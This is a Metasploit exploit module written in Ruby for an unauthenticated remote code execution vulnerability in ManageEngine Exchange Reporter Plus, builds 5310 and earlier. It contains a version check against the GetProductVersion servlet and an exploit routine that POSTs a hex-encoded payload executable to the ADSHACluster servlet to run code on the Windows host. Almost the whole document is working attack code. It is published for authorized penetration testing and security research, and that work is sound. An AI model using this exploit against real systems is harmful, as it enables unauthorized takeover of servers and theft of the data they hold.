# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule  < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Manage Engine Exchange Reporter Plus Unauthenticated RCE&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote code execution vulnerability that
        exists in Exchange Reporter Plus <= 5310, caused by execution of
        bcp.exe file inside ADSHACluster servlet
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Kacper Szurek <kacperszurek@gmail.com>&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://security.szurek.pl/manage-engine-exchange-reporter-plus-unauthenticated-rce.html&#039;]
        ],
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Jun 28 2018&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The URI of the application&#039;, &#039;/&#039;]),
        Opt::RPORT(8181),
      ])

  end

  def bin_to_hex(s)
      s.each_byte.map { |b| b.to_s(16).rjust(2,&#039;0&#039;) }.join
  end

  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;exchange&#039;, &#039;servlet&#039;, &#039;GetProductVersion&#039;)
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Safe
    end

    unless res.code == 200
      vprint_status &#039;Target is not Manage Engine Exchange Reporter Plus&#039;
      return CheckCode::Safe
    end

    begin
      json = res.get_json_document
      raise if json.empty? || !json[&#039;BUILD_NUMBER&#039;]
    rescue
      vprint_status &#039;Target is not Manage Engine Exchange Reporter Plus&#039;
      return CheckCode::Safe
    end

    vprint_status "Version: #{json[&#039;BUILD_NUMBER&#039;]}"

    if json[&#039;BUILD_NUMBER&#039;].to_i <= 5310
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def exploit
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;exchange&#039;, &#039;servlet&#039;, &#039;ADSHACluster&#039;),
      &#039;vars_post&#039; => {
        &#039;MTCALL&#039;  => "nativeClient",
        &#039;BCP_RLL&#039; => "0102",
        &#039;BCP_EXE&#039; => bin_to_hex(generate_payload_exe)
      }
    })
  end
end

